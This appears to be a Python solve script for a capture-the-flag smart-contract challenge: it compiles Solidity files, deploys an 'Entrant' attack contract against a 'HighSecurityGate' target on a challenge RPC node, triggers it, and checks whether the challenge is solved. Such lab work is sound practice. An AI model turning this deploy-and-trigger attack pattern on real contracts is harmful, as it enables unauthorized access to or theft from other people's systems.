from solcx import compile_files, install_solc_pragma
from web3 import Web3
from pwn import log, remote
install_solc_pragma('pragma solidity ^0.8.18;')
log.setLevel('debug')


rpc = "http://159.65.81.51:32471/"
private_key = input().strip()
setupContract = input().strip()
log.info(f"{private_key = }")
log.info(f"{setupContract = }")
# compile sol
compiled_sol = compile_files(
    ['Setup.sol', 'FortifiedPerimeter.sol', 'Entrant.sol'],
    output_values=['abi', 'bin'],
    solc_version="0.8.18"
)
SetupContract = compiled_sol['Setup.sol:Setup']
GateContract = compiled_sol['FortifiedPerimeter.sol:HighSecurityGate']
AttackContract = compiled_sol['Entrant.sol:Entrant']

w3 = Web3(Web3.HTTPProvider(rpc))
account = w3.eth.account.from_key(private_key)
my_address = account.address
log.info(f"My address: {my_address}")
log.info(f"My balance: {w3.eth.get_balance(my_address)}")

# log.debug("All accounts in this current network: ")
# for _address in w3.eth.accounts:
#     log.info(f"Address: {_address}, balance: {w3.eth.get_balance(_address)}")


# remote contract
Setup = w3.eth.contract(address=setupContract, abi=SetupContract['abi'])
GateAddress = Setup.functions.TARGET().call()
Gate = w3.eth.contract(
    address=GateAddress, abi=GateContract['abi'])


def attack_deploy(Contract, *argv):
    contract = w3.eth.contract(abi=Contract['abi'], bytecode=Contract['bin'])
    transaction = contract.constructor(*argv    ).buildTransaction(
        {
            "chainId": w3.eth.chain_id,
            "gasPrice": w3.eth.gas_price,
            "from": my_address,
            "nonce": w3.eth.get_transaction_count(my_address),
        }
    )
    sign_transaction = w3.eth.account.sign_transaction(
        transaction, private_key=private_key)
    print("Deploying Contract!")
    # Send the transaction
    transaction_hash = w3.eth.send_raw_transaction(
        sign_transaction.rawTransaction
    )
    # Wait for the transaction to be mined, and get the transaction receipt
    print("Waiting for transaction to finish...")
    transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
    print(transaction_receipt)
    print(f"Done! Contract deployed to {transaction_receipt.contractAddress}")
    return str(transaction_receipt.contractAddress)


AttackAddress = attack_deploy(AttackContract, GateAddress)
Attack = w3.eth.contract(address=AttackAddress, abi=AttackContract['abi'])



transaction = Attack.fallback.buildTransaction({
    "chainId": w3.eth.chainId,
    "gasPrice": w3.eth.gas_price,
    "from": my_address,
    "nonce": w3.eth.getTransactionCount(my_address)
})
sign_transaction = w3.eth.account.sign_transaction(
    transaction, private_key=private_key)
# Send the transaction
transaction_hash = w3.eth.send_raw_transaction(
    sign_transaction.rawTransaction
)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
log.info(str(Gate.functions.lastEntrant().call()))
log.info(str(Setup.functions.isSolved().call()))
